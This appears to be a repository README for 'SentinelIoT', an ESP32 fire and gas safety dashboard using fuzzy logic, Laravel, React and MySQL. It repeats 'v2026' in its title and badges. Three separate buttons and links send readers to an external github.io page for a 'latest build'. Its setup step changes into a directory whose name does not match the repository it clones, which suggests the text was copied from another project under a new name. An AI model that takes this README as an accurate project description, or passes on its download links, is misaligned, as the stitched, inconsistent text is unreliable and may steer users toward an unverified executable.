# SentinelIoT v2026 - IoT safety monitoring dashboard 2026

> **SentinelIoT is a browser-based safety dashboard for ESP32 IoT setups, combining live sensing, Sugeno fuzzy logic, and interactive controls to monitor fire and gas risk in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-ESP32%2C%20web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tom-taylor53/sentineliot-fuzzy-monitor-hub?style=flat-square)](https://github.com/tom-taylor53/sentineliot-fuzzy-monitor-hub)

---

<p align="center">
  <a href="https://tom-taylor53.github.io/sentineliot-fuzzy-monitor-hub/">
    <img src="https://img.shields.io/badge/Download-SentinelIoT%20Latest-brightgreen?style=for-the-badge" alt="Download SentinelIoT">
  </a>
</p>

> **[Direct Download - SentinelIoT v2026](https://tom-taylor53.github.io/sentineliot-fuzzy-monitor-hub/)**

---

[Download Latest Build](https://tom-taylor53.github.io/sentineliot-fuzzy-monitor-hub/)

---

## Overview

SentinelIoT turns ESP32 sensor streams into a web dashboard where users can inspect environmental readings, confirm hazard status, and operate connected devices from a single interface. Its main focus is live monitoring paired with a fuzzy-logic decision layer, which makes it better suited to fire and gas risk interpretation than basic threshold-based alerts.

The application stack includes a Laravel backend, React frontend, MySQL persistence, Pusher-powered updates, and a 3D visualization layer for improved awareness of the system state. In addition to automated actuator responses, the platform provides manual override controls, API key authentication, device administration tools, and stored history for reviewing prior events.

---

## Capabilities

- Live sensor tracking for connected ESP32 devices
- Sugeno-based fuzzy logic hazard evaluation
- Support for fire and gas detection workflows
- Automatic actuator actions driven by system rules
- Manual override mode for operator intervention
- Flame emergency override handling
- Device CRUD management for endpoint maintenance
- Historical charts, logs, and event inspection tools
- 3D dashboard visualization with a modern web UI
- API key authentication for secured access
- Python worker command execution for background processing

---

## Setup

Clone the repository and install the dependencies required by both the backend and frontend parts of the project.

1. Download or clone the project:
   - `git clone https://github.com/tom-taylor53/sentineliot-fuzzy-monitor-hub.git
2. Enter the project directory:
   - `cd MiniProjectCC-iot-fuzzy-dashboard`
3. Configure the Laravel app, React build pipeline, and MySQL connection to match your local environment.
4. Launch the backend, frontend, and worker processes according to your deployment setup.

If you are using the published build, open the latest release link and start the dashboard from there.

---

## How to Use

Once the project is configured, connect the ESP32 device so its sensor data can flow into the dashboard. Incoming readings are processed through the fuzzy-logic layer and reflected in the interface in real time.

Typical workflow:

1. Register or configure the device in the dashboard.
2. Send sensor data from the ESP32 node.
3. Review live status, hazard indicators, and historical charts.
4. Use automated control or switch to manual override when needed.
5. Check logs and device records for follow-up analysis.

For day-to-day use, keep the dashboard open in the browser and watch for updates as readings arrive through the real-time channel.

---

## Configuration

Primary settings are usually handled through the application environment and device records stored in the database.

Example environment values:

```env
APP_URL=http://localhost
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_DATABASE=sentineliot
DB_USERNAME=root
DB_PASSWORD=
PUSHER_APP_KEY=your_key
API_KEY=your_api_key
```

Adjust device endpoints, worker behavior, and real-time integration settings from your local deployment files and administrative screens.

---

## Requirements

- ESP32-based IoT device for sensor input
- Web browser for dashboard access
- Laravel 13 backend environment
- React frontend build tooling
- MySQL database
- Pusher-compatible real-time updates
- Python runtime for worker command execution
- Storage for logs, charts, and device records

---

## FAQ

**How do I get updates for the dashboard?**  
Use the latest build link above, or check repository releases and deployment artifacts if they are available.

**Where do I change sensor or device settings?**  
Most device-related values live in the dashboard and are stored in the application database, while environment settings are kept for connection details.

**What if live data is not appearing?**  
Verify the ESP32 connection, API key authentication, real-time update configuration, and database connectivity before checking the worker process.

**Can I switch from automatic to manual control?**  
Yes. Manual override mode is included for times when operator input is required.

**How are hazards evaluated?**  
SentinelIoT uses a fuzzy-logic approach with a Sugeno engine to interpret sensor input and generate a hazard assessment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
